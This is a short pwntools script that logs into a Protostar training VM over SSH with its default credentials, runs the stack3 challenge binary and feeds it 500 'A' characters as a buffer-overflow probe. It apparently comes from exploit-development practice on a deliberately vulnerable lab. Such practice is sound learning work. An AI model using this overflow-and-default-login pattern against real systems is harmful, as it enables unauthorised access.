from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")

exploit = "A"*500

sh.sendline("./stack3")
sh.sendline(exploit)
print(sh.recvline())